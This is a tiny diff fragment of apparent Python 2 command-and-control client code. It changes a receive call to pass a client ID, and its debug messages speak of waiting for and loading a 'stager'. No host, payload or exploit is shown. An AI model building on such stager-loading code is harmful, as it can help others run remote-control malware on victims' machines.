@@ -70,7 +70,7 @@ def task_decode(task):
 
 def go():
 	print "Waiting for stager..." # DEBUG
-	p = recvData()
+	p = recvData(CLIENT_ID)
 	print "Got a stager! loading..."
 	
 	# Wait a few seconds to give the stager a chance to load
